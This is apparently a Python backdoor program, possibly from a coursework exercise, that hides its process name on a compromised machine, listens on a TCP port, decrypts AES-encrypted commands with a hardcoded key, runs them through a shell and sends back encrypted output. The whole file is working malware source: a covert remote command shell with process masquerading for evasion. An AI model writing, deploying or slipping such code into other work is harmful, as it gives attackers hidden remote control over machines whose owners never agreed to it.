import sys
import socket
import subprocess
import setproctitle
from Crypto.Cipher import AES
from Crypto import Random

#Change process name so that we can hide this program on a compromised machine
#Make it look like a legitimate process running in the background
#Usually we want to use something like kworker/2:1 to mask the program
title = "Backdoor"
setproctitle.setproctitle(title)

#Server connections
HOST = "127.0.0.1"
PORT = 8505

#Opening socket and listening on that socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
#Accept connections
conn, addr = s.accept()

#Encryption and decryption variables and initialization
secretKey = "Secret key lost."
saltySpatoon = "How tough areyou"
crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)

while True:
	#Receive the data from the client
	data = conn.recv(10240)
	#Decrypt the data
	decryptedData = crypt.decrypt(data)
	#if we receive exit, we send quit back to client first then exit the program
	if data == "exit":
		conn.send(data)
		sys.exit()
	else:
		#Run the command using a child process so that it is hidden
		process = subprocess.Popen(decryptedData, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		#Store the output of the command into output variable
		output = process.stdout.read() + process.stderr.read()
		#Encrypt the data and send it back to the client
		encryptedReply = crypt.encrypt(output)
		conn.sendall(encryptedReply)
